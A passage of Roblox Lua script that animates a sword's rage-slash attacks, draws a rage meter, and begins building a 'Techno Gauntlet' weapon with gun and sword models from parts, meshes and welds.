LW.C1 = CFrame.new(0, 0.5, 0) * CFrame.Angles(0, 0, 0)
w1.C0 = CFrame.Angles(math.rad(-90), math.rad(0), math.rad(270)) * CFrame.new(0, 0, 0)
wt.C0 = CFrame.Angles(0,math.rad(45-90*i),0)
local Point = prt4.CFrame * CFrame.new(0,prt4.Size.Y/-2,0)
--
local mesh = Instance.new("SpecialMesh")
mesh.Scale = Vector3.new(1,1,1)
mesh.MeshId = "http://www.roblox.com/asset/?id=20329976"
local shell = Instance.new("Part")
mesh.Parent = shell
shell.Anchored = true
shell.formFactor = 3
shell.Size = Vector3.new(0.2,0.2,0.2)
shell.CFrame = CFrame.new(LastPoint.p,Point.p) * CFrame.Angles(math.rad(90),0,0)
shell.Parent = swordholder
shell.Transparency = 1
shell.Reflectance = 0.2
shell.BrickColor = BrickColor.new("Bright red")
shell.CanCollide = false
coroutine.resume(coroutine.create(function()
for i = 0 ,1,0.2 do
wait()
shell.Transparency = 1-1*i
mesh.Scale = Vector3.new(1+0.5*i,1+0.5*i,1+0.5*i)
end
for i = 0 ,1,0.2 do
wait()
shell.Transparency = 1*i
mesh.Scale = Vector3.new(1.5+1*i,1.5+1*i,1.5+1*i)
end
shell.Parent = nil
end))
--
LastPoint = Point
end
dmgdc()
returndmg()
conn:disconnect()
for i = 0 ,1 , 0.1 do
wait()
RW.C0 = CFrame.new(0.5+1*i, 0.5, -1+1*i) * CFrame.Angles(math.rad(135-90*i),math.rad(45*i),math.rad(-45+45*i))
RW.C1 = CFrame.new(0, 0.5, 0) * CFrame.Angles(0, 0, 0)
LW.C0 = CFrame.new(-1.5, 0.5, 0) * CFrame.Angles(math.rad(-45+90*i),math.rad(-45*i),math.rad(-45+45*i))
LW.C1 = CFrame.new(0, 0.5, 0) * CFrame.Angles(0, 0, 0)
w1.C0 = CFrame.Angles(math.rad(-90), math.rad(0), math.rad(270-180*i)) * CFrame.new(0, 0, 0)
wt.C0 = CFrame.Angles(0,math.rad(-45+45*i),0)
end
RHL.Part0 = Torso
LHL.Part0 = Torso
RW.Part0 = Torso
LW.Part0 = Torso
T.Parent = nil
Torso.Transparency = 0
wait(0.1)
attack = false
end
function RageSlash1()
if Rage < 10 then return end
Rage = Rage - 10
attack = true
ss(Head,1)
for i = 0 , 1 , 0.1 do
wait()
RW.C0 = CFrame.new(1.5-1*i, 0.5, -1*i) * CFrame.Angles(math.rad(45+45*i),math.rad(45+25*i),math.rad(0))
RW.C1 = CFrame.new(0, 0.5, 0) * CFrame.Angles(math.rad(-90*i), 0, 0)
LW.C0 = CFrame.new(-1.5, 0.5, 0) * CFrame.Angles(math.rad(45-90*i),math.rad(-45+45*i),0)
LW.C1 = CFrame.new(0, 0.5, 0) * CFrame.Angles(0, 0, 0)
end
subdmg(-5)
nrdmgcnnct()
local hit,pos = rayCast(Torso.Position,Torso.CFrame.lookVector,20,Character) 
local vel = Instance.new("BodyPosition",Torso)
vel.maxForce = Vector3.new(1,1,1) * math.huge
vel.P = vel.P * 2
vel.position = pos
coroutine.resume(coroutine.create(function()
wait(0.075)
vel.Parent=nil
end))
LastPoint = prt4.CFrame * CFrame.new(0,prt4.Size.Y/-2,0)
for i = 0 , 1 , 0.2 do
wait()
RW.C0 = CFrame.new(0.5+1*i, 0.5, -1+1*i) * CFrame.Angles(math.rad(90),math.rad(70),math.rad(0))
RW.C1 = CFrame.new(0, 0.5, 0) * CFrame.Angles(math.rad(-90+180*i), 0, 0)
LW.C0 = CFrame.new(-1.5, 0.5, 0) * CFrame.Angles(math.rad(-45),math.rad(0),0)
LW.C1 = CFrame.new(0, 0.5, 0) * CFrame.Angles(0, 0, 0)
local Point = prt4.CFrame * CFrame.new(0,prt4.Size.Y/-2,0)
effect("White",0.5,LastPoint,Point)
LastPoint = Point
end
for i = 0 , 1 , 0.2 do
wait()
RW.C0 = CFrame.new(1.5, 0.5, 0) * CFrame.Angles(math.rad(90),math.rad(70),math.rad(0))
RW.C1 = CFrame.new(0, 0.5, 0) * CFrame.Angles(math.rad(90+20*i), 0, 0)
LW.C0 = CFrame.new(-1.5, 0.5, 0) * CFrame.Angles(math.rad(-45),math.rad(0),0)
LW.C1 = CFrame.new(0, 0.5, 0) * CFrame.Angles(0, 0, 0)
local Point = prt4.CFrame * CFrame.new(0,prt4.Size.Y/-2,0)
effect("White",0.5,LastPoint,Point)
LastPoint = Point
end
dmgdc()
returndmg()
wait(0.1)
atktype(1,4)
attack = false
for i = 0 , 1 , 0.1 do
if attack then return end
wait()
RW.C0 = CFrame.new(1.5, 0.5, 0) * CFrame.Angles(math.rad(90-45*i),math.rad(70-25*i),math.rad(0))
RW.C1 = CFrame.new(0, 0.5, 0) * CFrame.Angles(math.rad(110-110*i), 0, 0)
LW.C0 = CFrame.new(-1.5, 0.5, 0) * CFrame.Angles(math.rad(-45+90*i),math.rad(-45*i),0)
LW.C1 = CFrame.new(0, 0.5, 0) * CFrame.Angles(0, 0, 0)
end
end
function RageSlash2()
if Rage < 10 then return end
Rage = Rage - 10
attack = true
ss(Head,1)
local trscf = Torso.CFrame
local vel = Instance.new("BodyAngularVelocity",Torso)
vel.maxTorque = Vector3.new(1,1,1) * math.huge
vel.P = vel.P * 4
vel.angularvelocity = Vector3.new(0,20,0)
nrdmgcnnct()
for i = 0 , 1 , 0.1 do 
wait()
RW.C0 = CFrame.new(1.5, 0.5, 0) * CFrame.Angles(math.rad(90),math.rad(70-70*i),math.rad(90*i))
RW.C1 = CFrame.new(0, 0.5, 0) * CFrame.Angles(math.rad(110-110*i), math.rad(90*i), 0)
LW.C0 = CFrame.new(-1.5, 0.5, 0) * CFrame.Angles(math.rad(-45+135*i),math.rad(0),math.rad(-90*i))
LW.C1 = CFrame.new(0, 0.5, 0) * CFrame.Angles(0, 0, 0)
end
rptddmg(vel.Parent,nil,0.75)
repeat
Rage = Rage - 10
wait(1)
until Rage < 20
dmgdc()
wait(0.1)
vel.Parent = nil
for i = 0 , 1 , 0.1 do
wait()
RW.C0 = CFrame.new(1.5, 0.5, 0) * CFrame.Angles(math.rad(90-45*i),math.rad(45*i),math.rad(90-90*i))
RW.C1 = CFrame.new(0, 0.5, 0) * CFrame.Angles(math.rad(0), math.rad(90-90*i), 0)
LW.C0 = CFrame.new(-1.5, 0.5, 0) * CFrame.Angles(math.rad(90-45*i),math.rad(-45*i),math.rad(-90+90*i))
LW.C1 = CFrame.new(0, 0.5, 0) * CFrame.Angles(0, 0, 0)
end
attack = false
end
function returnwelds()
RW.C0 = CFrame.new(1.5, 0.5, 0) * CFrame.Angles(math.rad(45),math.rad(45),0)
RW.C1 = CFrame.new(0, 0.5, 0) * CFrame.Angles(0, 0, 0)
LW.C0 = CFrame.new(-1.5, 0.5, 0) * CFrame.Angles(math.rad(45),math.rad(-45),0)
LW.C1 = CFrame.new(0, 0.5, 0) * CFrame.Angles(0, 0, 0)
w1.C0 = CFrame.Angles(math.rad(-90), math.rad(0), math.rad(90)) * CFrame.new(0, 0, 0)
RWL.C0 = CFrame.new(1, -1, 0) * CFrame.Angles(0, 0, 0)
RWL.C1 = CFrame.new(0.5, 1, 0)
LWL.C0 = CFrame.new(-1, -1, 0) * CFrame.Angles(0, 0, 0)
LWL.C1 = CFrame.new(-0.5, 1, 0)
end
function ob1d(mouse) 
hold = true 
if bll and Rage > 10 then
bl = true
end
if attack then return end
if attacktype == 1 then
Slash1()
elseif attacktype == 2 then
Slash2()
elseif attacktype == 3 then
Slash3()
end
end 
function ob1u(mouse)  
end 
buttonhold = false
function key(key)
if attack then return end
if key == "f" then
buttonhold = true
Guard()
end
if key == "q" then
Powerslash()
end
if key == "e" then
Upperslash()
end
if key == "r" and (string.match(Player.Unlocks.Value,"Rage Slash Combo") ~= nil) then
if attacktype == 1 then
RageSlash1()
elseif attacktype == 4 then
RageSlash2()
end
end
end
function key2(key) 
if key == "f" then
buttonhold = false
end
end 
function s(mouse) 
repeat wait() until not attack
repeat wait() until not ev.Value
mouse.Button1Down:connect(function() ob1d(mouse) end) 
mouse.Button1Up:connect(function() ob1u(mouse) end) 
mouse.KeyDown:connect(key) 
mouse.KeyUp:connect(key2) 
equipanim()
ev.Value = true
end 
function ds(mouse) 
repeat wait() until not attack
repeat wait() until ev.Value
hideanim()
wait(0.1)
ev.Value = false
end 
Bin.Selected:connect(s) 
Bin.Deselected:connect(ds) 
if PlayerGui:findFirstChild("RageMeter") ~= nil then
PlayerGui:findFirstChild("RageMeter").Parent = nil
end
local fullrage = false
coroutine.resume(coroutine.create(function()
local SG = Instance.new("ScreenGui",PlayerGui)
SG.Name = "RageMeter"
local frame = Instance.new("Frame",SG)
frame.Size = UDim2.new(0.2,0,0.1,0)
frame.Position = UDim2.new(0.5-0.1,0,0.05,0)
frame.BackgroundColor3 = BrickColor.new("Bright red").Color
local ragetext = Instance.new("TextLabel",frame)
ragetext.Size = UDim2.new(1,0,0.35,0)
ragetext.BackgroundTransparency = 1
ragetext.Text = "Rage"
ragetext.FontSize = "Size18"
local backing = Instance.new("ImageLabel",frame)
backing.Size = UDim2.new(0.8,0,0.45,0)
backing.Image = "http://www.roblox.com/asset/?id=48965808"
backing.Position = UDim2.new(0.1,0,0.45,0)
backing.BackgroundColor3 = BrickColor.new("Black").Color
local img = Instance.new("ImageLabel",backing)
img.Size = UDim2.new(1,0,1,0)
img.Image = "http://www.roblox.com/asset/?id=48965808"
img.Position = UDim2.new(0,0,0,0)
img.BackgroundColor3 = Color3.new(0.7,0.15,0.1) --BrickColor.new("Bright red").Color
local percent = Instance.new("TextLabel",backing)
percent.Size = UDim2.new(1,0,1,0)
percent.BackgroundTransparency = 1
percent.TextColor3 = BrickColor.new("White").Color
percent.Text = math.floor((Rage/MaxRage)*100).."%"
percent.FontSize = "Size18"
local frame2 = Instance.new("Frame",frame)
frame2.Size = UDim2.new(1,0,0.5,0)
frame2.Position = UDim2.new(0,0,-0.5,0)
frame2.BackgroundTransparency = 1
local function updateblk()
for i,z in pairs(frame2:GetChildren()) do
z.Parent = nil
end
for i = 1,blkc.Value do
local gimg = Instance.new("ImageLabel",frame2)
gimg.Size = UDim2.new(0.125,0,0.5,0)
gimg.Image = "http://www.roblox.com/asset/?id=48908046"
local ii = 1
if i <= 10 then
ii = 1
elseif i > 10 then
ii = 0
i = i - 10
end
gimg.Position = UDim2.new((0.1*i)-0.1075,0,0.5*ii,0)
gimg.BackgroundTransparency = 1
end
end
repeat
wait()
pcall(function()
updateblk()
img.Size = UDim2.new(1*(Rage/MaxRage),0,1,0)
percent.Text = math.floor((Rage/MaxRage)*100).."%"
if math.floor((Rage/MaxRage)*100) > 99 then
coroutine.resume(coroutine.create(function()
if not fullrage then
bs(Head,1.1)
fullrage = true
repeat
for i = 0 , 1 , 0.1 do
wait()
img.BackgroundColor3 = Color3.new(0.7+0.3*i,0.15+0.5*i,0.1+0.5*i)
end
for i = 0 , 1 , 0.1 do
wait()
img.BackgroundColor3 = Color3.new(1-0.75*i,0.65-0.65*i,0.6-0.6*i)
end
for i = 0 , 1 , 0.1 do
wait()
img.BackgroundColor3 = Color3.new(0.25+0.45*i,0.15*i,0.1*i)
end
until math.floor((Rage/MaxRage)*100) < 100
fullrage = false
end
end))
end
end)
until SG.Parent == nil
end))

end}
module[2] = {"Techno Gauntlet",function()


	Player = game:GetService("Players").LocalPlayer 
Character = Player.Character 
PlayerGui = Player.PlayerGui 
Backpack = Player.Backpack 
Torso = Character.Torso 
Head = Character.Head 
Humanoid = Character.Humanoid
LeftArm = Character["Left Arm"] 
LeftLeg = Character["Left Leg"] 
RightArm = Character["Right Arm"] 
RightLeg = Character["Right Leg"] 
LS = Torso["Left Shoulder"] 
LH = Torso["Left Hip"] 
RS = Torso["Right Shoulder"] 
RH = Torso["Right Hip"] 
Neck = Torso.Neck
it=Instance.new
vt=Vector3.new
cf=CFrame.new
euler=CFrame.fromEulerAnglesXYZ
angles=CFrame.Angles
necko=cf(0, 1, 0, -1, -0, -0, 0, 0, 1, 0, 1, 0)
necko2=cf(0, -0.5, 0, -1, -0, -0, 0, 0, 1, 0, 1, 0)
attack = false 
attacktype = 1 
attackdebounce = false 
MMouse=nil
combo=0
Mode="Choose"
Aiming=false
DroneTarget=Torso.Position
Drone1=nil
Drone2=nil
Drone3=nil
Bullets=10
BowAim=false
SnipAim=false
--player 
player = nil 
--save shoulders 
RSH, LSH = nil, nil 
--welds 
RW, LW = Instance.new("Weld"), Instance.new("Weld") 
RW.Name="Right Shoulder" LW.Name="Left Shoulder"
 
 
if Character:findFirstChild("Techno Gauntlet",true) ~= nil then 
Character:findFirstChild("Techno Gauntlet",true).Parent = nil 
end 
 
 
function part(formfactor,parent,reflectance,transparency,brickcolor,name,size)
local fp = it("Part")
fp.formFactor = formfactor 
fp.Parent = parent
fp.Reflectance = reflectance
fp.Transparency = transparency
fp.CanCollide = false 
fp.Locked=true
fp.BrickColor = brickcolor
fp.Name = name
fp.Size = size
fp.Position = Torso.Position 
fp.BottomSurface="Smooth"
fp.TopSurface="Smooth"
fp:BreakJoints()
return fp 
end 
 
function mesh(Mesh,part,meshtype,meshid,offset,scale)
local mesh = it(Mesh) 
mesh.Parent = part
if Mesh=="SpecialMesh" then
mesh.MeshType = meshtype
mesh.MeshId = meshid
end
mesh.Offset=offset
mesh.Scale=scale
return mesh
end
 
function weld(parent,part0,part1,c0)
local weld = it("Weld") 
weld.Parent = parent
weld.Part0 = part0 
weld.Part1 = part1 
weld.C0 = c0
return weld
end
 
local cone=part(3,modelzorz,0,1,BrickColor.new("Bright blue"),"Cone",vt(1,1,1))
local conemsh=mesh("SpecialMesh",cone,"FileMesh","http://www.roblox.com/asset/?id=1778999",vt(0,0,0),vt(0.5,0.5,0.5))
local screen1=part(3,modelzorz,0,1,BrickColor.new("Bright blue"),"Screen1",vt(1,1,1))
local screen1msh=mesh("BlockMesh",screen1,"","",vt(0,0,0),vt(0.1,0.8,0.9))
local screen2=part(3,modelzorz,0,1,BrickColor.new("Bright blue"),"Screen2",vt(1,1,1))
local screen2msh=mesh("BlockMesh",screen2,"","",vt(0,0,0),vt(0.1,0.8,0.9))
local screen3=part(3,modelzorz,0,1,BrickColor.new("Bright blue"),"Screen3",vt(1,1,1))
local screen3msh=mesh("BlockMesh",screen3,"","",vt(0,0,0),vt(0.1,0.8,0.9))
light1=Instance.new("PointLight")
light1.Brightness=.8
light1.Color=Color3.new(.2,.2,255)
light1.Range=10
light1.Parent=screen1
light2=light1:Clone()
light2.Parent=screen2
light3=light1:Clone()
light3.Parent=screen3
 
if Character:findFirstChild("Drone",true) ~= nil then 
Character:findFirstChild("Drone",true).Parent = nil 
end 
 
local modelzorz = Instance.new("Model") 
modelzorz.Parent = Character 
modelzorz.Name = "Techno Gauntlet" 
 
local prt1=part(3,modelzorz,0,0,BrickColor.new("Black"),"Part1",vt(1,1,1))
local prt2=part(3,modelzorz,0,0,BrickColor.new("Dark stone grey"),"Part2",vt(1,1,1))
local prt3=part(3,modelzorz,0,0,BrickColor.new("Dark stone grey"),"Part3",vt(1,1,1))
local prt4=part(3,modelzorz,0,0,BrickColor.new("Dark stone grey"),"Part4",vt(1,1,1))
local prt5=part(3,modelzorz,0,0,BrickColor.new("Dark stone grey"),"Part5",vt(1,1,1))
local prt6=part(3,modelzorz,0,0,BrickColor.new("Medium stone grey"),"Part6",vt(1,1,1))
local prt7=part(3,modelzorz,0,0,Torso.BrickColor,"Part7",vt(1,1,1))
local prt8=part(3,modelzorz,0,0,BrickColor.new("Dark stone grey"),"Part8",vt(1,1,1))
local prt9=part(3,modelzorz,0,0,BrickColor.new("Medium stone grey"),"Part9",vt(1,1,1))
local prt10=part(3,modelzorz,0,0,BrickColor.new("Black"),"Part10",vt(1,1,1))
 
msh1=mesh("BlockMesh",prt1,"","",vt(0,0,0),vt(1.1,0.6,1.1))
msh2=mesh("BlockMesh",prt2,"","",vt(0,0,0),vt(0.2,0.7,1.05))
msh3=mesh("BlockMesh",prt3,"","",vt(0,0,0),vt(1.05,0.7,0.2))
msh4=mesh("BlockMesh",prt4,"","",vt(0,0,0),vt(1.4,1.6,0.2))
msh5=mesh("BlockMesh",prt5,"","",vt(0,0,0),vt(1.4,1.6,0.2))
msh6=mesh("BlockMesh",prt6,"","",vt(0,0,0),vt(0.6,0.1,0.6))
msh7=mesh("SpecialMesh",prt7,"Sphere","",vt(0,0,0),vt(0.5,0.5,0.5))
msh8=mesh("CylinderMesh",prt8,"","",vt(0,0,0),vt(0.6,0.1,0.6))
msh9=mesh("CylinderMesh",prt9,"","",vt(0,0,0),vt(0.3,0.1,0.3))
msh10=mesh("CylinderMesh",prt10,"","",vt(0,0,0),vt(0.2,0.1,0.2))
 
local wld1=weld(prt1,prt1,RightArm,euler(0,0,0)*cf(0,0.3,0))
local wld2=weld(prt2,prt2,prt1,euler(0,0,0)*cf(0,0.4,0))
local wld3=weld(prt3,prt3,prt1,euler(0,0,0)*cf(0,0.4,0))
local wld4=weld(prt4,prt4,prt1,euler(0,0.785,0)*cf(0,-0.51,0))
local wld5=weld(prt5,prt5,prt1,euler(0,-0.785,0)*cf(0,-0.51,0))
local wld6=weld(prt6,prt6,prt1,euler(0,0,0)*cf(0,-1.3,0))
local wld7=weld(prt7,prt7,prt6,euler(0,0,0)*cf(0,0,0))
local wld8=weld(prt8,prt8,prt1,euler(0,0,-1.57)*cf(-0.55,0,0))
local wld9=weld(prt9,prt9,prt8,euler(0,0,0)*cf(0,0.05,0))
local wld10=weld(prt10,prt10,prt9,euler(0,0,0)*cf(0,0.01,0))
 
numb2=0
for i=1,4 do
numb=0.3
for i=1,3 do
local prtclaw=part(3,modelzorz,0,0,BrickColor.new("Medium stone grey"),"Partclaw",vt(1,1,1))
mshclaw=mesh("SpecialMesh",prtclaw,"Wedge","",vt(0,0,0),vt(0.1,0.3,0.1))
local wldclaw=weld(prtclaw,prtclaw,prt1,euler(1.57,-1.57,-1.57)*cf(-0.55,0.3,numb)*euler(0,numb2,0))
numb=numb-0.3
end
numb2=numb2+1.57
end
 
numb=0
for i=1,5 do
local prtgear=part(3,modelzorz,0,0,BrickColor.new("Medium stone grey"),"Partgear",vt(1,1,1))
mshgear=mesh("BlockMesh",prtgear,"","",vt(0,0,0),vt(0.4,0.09,0.07))
local wldgear=weld(prtgear,prtgear,prt9,euler(0,numb,0)*cf(0,0,0))
numb=numb+0.628
end
 
local gun = Instance.new("Model") 
gun.Parent = modelzorz
gun.Name = "Blitz" 
gun.Parent=nil
 
local gprt1=part(3,gun,0,0,BrickColor.new("Dark stone grey"),"Part1",vt(1,1,1))
local gprt2=part(3,gun,0,0,BrickColor.new("Black"),"Part2",vt(1,1,1))
local gprt3=part(3,gun,0,0,BrickColor.new("Black"),"Part3",vt(1,1,1))
local gprt4=part(3,gun,0,0,BrickColor.new("Black"),"Part4",vt(1,1,1))
local gprt5=part(3,gun,0,0,BrickColor.new("Black"),"Part5",vt(1,1,1))
local gprt6=part(3,gun,0,0,BrickColor.new("Dark stone grey"),"Part6",vt(1,1,1))
local gprt7=part(3,gun,0,0,BrickColor.new("Medium stone grey"),"Part7",vt(1,1,1))
local gprt8=part(3,gun,0,0,BrickColor.new("Black"),"Part8",vt(1,1,1))
local gprt9=part(3,gun,0,0,BrickColor.new("Dark stone grey"),"Part9",vt(1,1,1))
local gprt10=part(3,gun,0,0,BrickColor.new("Black"),"Part10",vt(1,1,1))
local gprt11=part(3,gun,0,0,BrickColor.new("Black"),"Part11",vt(1,1,1))
local gprt12=part(3,gun,0,0,BrickColor.new("Black"),"Part12",vt(1,1,1))
local gprt13=part(3,gun,0,0,BrickColor.new("Black"),"Part13",vt(1,1,1))
local gprt14=part(3,gun,0,0,BrickColor.new("Black"),"Part14",vt(1,1,1))
local gprt15=part(3,gun,0,0,BrickColor.new("Dark stone grey"),"Part15",vt(1,1,1))
local gprt16=part(3,gun,0,0,BrickColor.new("Dark stone grey"),"Part16",vt(1,1,1))
local gprt17=part(3,gun,0,0,BrickColor.new("Really black"),"Part17",vt(1,1,1))
local gprt18=part(3,gun,0,0,BrickColor.new("Black"),"Part18",vt(1,1,1))
local gprt19=part(3,gun,0,0,BrickColor.new("Dark stone grey"),"Part19",vt(1,1,1))
local gprt20=part(3,gun,0,0,BrickColor.new("Medium stone grey"),"Part20",vt(1,1,1))
local gprt21=part(3,gun,0,0,BrickColor.new("Medium stone grey"),"Part21",vt(1,1,1))
local gprt22=part(3,gun,0,0,BrickColor.new("Medium stone grey"),"Part22",vt(1,1,1))
 
gmsh1=mesh("BlockMesh",gprt1,"","",vt(0,0,0),vt(0.2,0.7,0.2))
gmsh2=mesh("BlockMesh",gprt2,"","",vt(0,0,0),vt(0.25,0.2,0.25))
gmsh3=mesh("BlockMesh",gprt3,"","",vt(0,0,0),vt(0.25,0.2,0.25))
gmsh4=mesh("BlockMesh",gprt4,"","",vt(0,0,0),vt(0.5,0.5,0.7))
gmsh5=mesh("CylinderMesh",gprt5,"","",vt(0,0,0),vt(0.5,0.49,0.5))
gmsh6=mesh("CylinderMesh",gprt6,"","",vt(0,0,0),vt(0.1,0.5,0.1))
gmsh7=mesh("BlockMesh",gprt7,"","",vt(0,0,0),vt(0.55,0.3,0.3))
gmsh8=mesh("CylinderMesh",gprt8,"","",vt(0,0,0),vt(0.7,0.7,0.7))
gmsh9=mesh("CylinderMesh",gprt9,"","",vt(0,0,0),vt(0.4,0.71,0.4))
gmsh10=mesh("BlockMesh",gprt10,"","",vt(0,0,0),vt(0.3,0.4,0.3))
gmsh11=mesh("BlockMesh",gprt11,"","",vt(0,0,0),vt(0.2,2.5,0.5))
gmsh12=mesh("CylinderMesh",gprt12,"","",vt(0,0,0),vt(0.3,0.51,0.3))
gmsh13=mesh("BlockMesh",gprt13,"","",vt(0,0,0),vt(0.2,0.3,0.5))
gmsh14=mesh("CylinderMesh",gprt14,"","",vt(0,0,0),vt(0.3,0.2,0.3))
gmsh15=mesh("CylinderMesh",gprt15,"","",vt(0,0,0),vt(0.2,0.35,0.2))
gmsh16=mesh("CylinderMesh",gprt16,"","",vt(0,0,0),vt(0.2,0.21,0.2))
gmsh17=mesh("CylinderMesh",gprt17,"","",vt(0,0,0),vt(0.15,0.22,0.15))
gmsh18=mesh("CylinderMesh",gprt18,"","",vt(0,0,0),vt(0.6,0.2,0.6))
gmsh19=mesh("CylinderMesh",gprt19,"","",vt(0,0,0),vt(0.7,0.2,0.7))
gmsh20=mesh("CylinderMesh",gprt20,"","",vt(0,0,0),vt(0.6,1.5,0.6))
gmsh21=mesh("CylinderMesh",gprt21,"","",vt(0,0,0),vt(0.69,0.5,0.69))
gmsh22=mesh("CylinderMesh",gprt22,"","",vt(0,0,0),vt(0.69,0.31,0.69))
 
local GunWelds={}
local gwld1=weld(gprt1,gprt1,Torso,euler(0.5,1.57,0)*cf(1,-0.5,1.8))
local gwld2=weld(gprt2,gprt2,gprt1,euler(0,0,0)*cf(0,0.3,0))
local gwld3=weld(gprt3,gprt3,gprt1,euler(0,0,0)*cf(0,-0.3,0))
local gwld4=weld(gprt4,gprt4,gprt3,euler(-0.5,0,0)*cf(0,-0.1,-0.1))
local gwld5=weld(gprt5,gprt5,gprt4,euler(0,0,1.57)*cf(0,0,-0.35))
local gwld6=weld(gprt6,gprt6,gprt5,cf(0,0,-0.1))
local gwld7=weld(gprt7,gprt7,gprt4,cf(0,0,-0.1))
local gwld8=weld(gprt8,gprt8,gprt4,euler(0,0,1.57)*cf(0,0,0.4))
local gwld9=weld(gprt9,gprt9,gprt8,cf(0,0,0))
local gwld10=weld(gprt10,gprt10,gprt8,euler(1.57,0,0)*cf(0,0,0.4)*euler(0,0.7,0))
local gwld11=weld(gprt11,gprt11,gprt8,euler(1.57,0,0)*cf(0.3,0,0.9))
local gwld12=weld(gprt12,gprt12,gprt11,euler(-1.57,0,0)*cf(0,-1.3,0))
local gwld13=weld(gprt13,gprt13,gprt12,cf(0,0,0.3)*euler(0,1.57,0))
local gwld14=weld(gprt14,gprt14,gprt13,cf(0.05,0,0.25))
local gwld15=weld(gprt15,gprt15,gprt14,cf(0,0,0))
local gwld16=weld(gprt16,gprt16,gprt13,euler(0,0,1.57)*cf(0,0,-0.1))
local gwld17=weld(gprt17,gprt17,gprt16,cf(0,0,0))
local gwld18=weld(gprt18,gprt18,gprt8,euler(1.57,0,0)*cf(-0.1,0,0.4))
local gwld19=weld(gprt19,gprt19,gprt18,cf(-0.05,-0.15,0))
local gwld20=weld(gprt20,gprt20,gprt19,cf(0,-0.8,0))
local gwld21=weld(gprt21,gprt21,gprt20,cf(0,0.5,0))
local gwld22=weld(gprt22,gprt22,gprt20,cf(0,-0.6,0))
table.insert(GunWelds,gwld1)
table.insert(GunWelds,gwld2)
table.insert(GunWelds,gwld3)
table.insert(GunWelds,gwld4)
table.insert(GunWelds,gwld5)
table.insert(GunWelds,gwld6)
table.insert(GunWelds,gwld7)
table.insert(GunWelds,gwld8)
table.insert(GunWelds,gwld9)
table.insert(GunWelds,gwld10)
table.insert(GunWelds,gwld11)
table.insert(GunWelds,gwld12)
table.insert(GunWelds,gwld13)
table.insert(GunWelds,gwld14)
table.insert(GunWelds,gwld15)
table.insert(GunWelds,gwld16)
table.insert(GunWelds,gwld17)
table.insert(GunWelds,gwld18)
table.insert(GunWelds,gwld19)
table.insert(GunWelds,gwld20)
table.insert(GunWelds,gwld21)
table.insert(GunWelds,gwld22)
 
numb=1.57
for i=1,10 do
local gprt23=part(3,gun,0,0,BrickColor.new("Medium stone grey"),"Part23",vt(1,1,1))
gmsh23=mesh("CylinderMesh",gprt23,"","",vt(0,0,0),vt(0.15,0.7,0.15))
local gwld23=weld(gprt23,gprt23,gprt20,cf(0,-0.1,-0.25)*euler(0,numb,0))
table.insert(GunWelds,gwld23)
local gprt24=part(3,gun,0,0,BrickColor.new("Really black"),"Part24",vt(1,1,1))
gmsh24=mesh("CylinderMesh",gprt24,"","",vt(0,0,0),vt(0.14,1.52,0.14))
local gwld24=weld(gprt24,gprt24,gprt20,cf(0,0,-0.25)*euler(0,numb,0))
table.insert(GunWelds,gwld24)
numb=numb+0.628
end
 
local sword=Instance.new("Model") 
sword.Parent=modelzorz
sword.Name="Daku" 
sword.Parent=nil
 
local sprt1=part(3,sword,0,0,BrickColor.new("Dark stone grey"),"Part1",vt(1,1,1))
local sprt2=part(3,sword,0,0,BrickColor.new("Medium stone grey"),"Part2",vt(1,1,1))
local sprt3=part(3,sword,0,0,BrickColor.new("Dark stone grey"),"Part3",vt(1,1,1))
local sprt4=part(3,sword,0,0,BrickColor.new("Medium stone grey"),"Part4",vt(1,1,1))
local sprt5=part(3,sword,0,0,BrickColor.new("Light stone grey"),"Part5",vt(1,1,1))
local sprt6=part(3,sword,0,0,BrickColor.new("Medium stone grey"),"Part6",vt(1,1,1))
local sprt7=part(3,sword,0,0,BrickColor.new("Medium stone grey"),"Part7",vt(1,1,1))
local sprt8=part(3,sword,0,0,BrickColor.new("Light stone grey"),"Part8",vt(1,1,1))
local sprt9=part(3,sword,0,0,BrickColor.new("Medium stone grey"),"Part9",vt(1,1,1))
local sprt10=part(3,sword,0,0,BrickColor.new("Dark stone grey"),"Part10",vt(1,1,1))
local sprt11=part(3,sword,0,0,BrickColor.new("Medium stone grey"),"Part11",vt(1,1,1))
local sprt12=part(3,sword,0,0,BrickColor.new("Light stone grey"),"Part12",vt(1,1,1))
local sprt13=part(3,sword,0,0,BrickColor.new("Medium stone grey"),"Part13",vt(1,1,1))
local sprt14=part(3,sword,0,0,BrickColor.new("Medium stone grey"),"Part14",vt(1,1,1))
local sprt15=part(3,sword,0,0,BrickColor.new("Light stone grey"),"Part15",vt(1,1,1))
local sprt16=part(3,sword,0,1,BrickColor.new("Black"),"Hitbox",vt(1,7,1.5))
local sprt17=part(3,sword,0,0,BrickColor.new("Bright yellow"),"Top",vt(1,1,1))
local sprt18=part(3,sword,0,1,BrickColor.new("Black"),"Mid",vt(0.1,0.1,0.1))
local sprt19=part(3,sword,0,0,BrickColor.new("Bright yellow"),"Bottom",vt(1,1,1))
 
smsh1=mesh("BlockMesh",sprt1,"","",vt(0,0,0),vt(0.2,1,0.2))
smsh2=mesh("SpecialMesh",sprt2,"Head","",vt(0,0,0),vt(0.4,0.3,0.4))
smsh3=mesh("BlockMesh",sprt3,"","",vt(0,0,0),vt(0.25,0.5,0.25))
smsh4=mesh("SpecialMesh",sprt4,"Head","",vt(0,0,0),vt(0.5,0.3,0.5))
smsh5=mesh("CylinderMesh",sprt5,"","",vt(0,0,0),vt(0.5,0.2,0.5))
smsh6=mesh("BlockMesh",sprt6,"","",vt(0,0,0),vt(0.5,0.2,0.35))
smsh7=mesh("BlockMesh",sprt7,"","",vt(0,0,0),vt(0.2,0.19,0.2))
smsh8=mesh("BlockMesh",sprt8,"","",vt(0,0,0),vt(0.8,0.15,0.5))
smsh9=mesh("SpecialMesh",sprt9,"Head","",vt(0,0,0),vt(0.4,0.3,0.4))
smsh10=mesh("BlockMesh",sprt10,"","",vt(0,0,0),vt(0.25,0.5,0.25))
smsh11=mesh("SpecialMesh",sprt11,"Head","",vt(0,0,0),vt(0.5,0.3,0.5))
smsh12=mesh("CylinderMesh",sprt12,"","",vt(0,0,0),vt(0.5,0.2,0.5))
smsh13=mesh("BlockMesh",sprt13,"","",vt(0,0,0),vt(0.5,0.2,0.35))
smsh14=mesh("BlockMesh",sprt14,"","",vt(0,0,0),vt(0.2,0.19,0.2))
smsh15=mesh("BlockMesh",sprt15,"","",vt(0,0,0),vt(0.8,0.15,0.5))
smsh17=mesh("CylinderMesh",sprt17,"","",vt(0,0,0),vt(0.1,0.05,0.1))
smsh19=mesh("CylinderMesh",sprt19,"","",vt(0,0,0),vt(0.1,0.05,0.1))
 
local SwordWelds={}
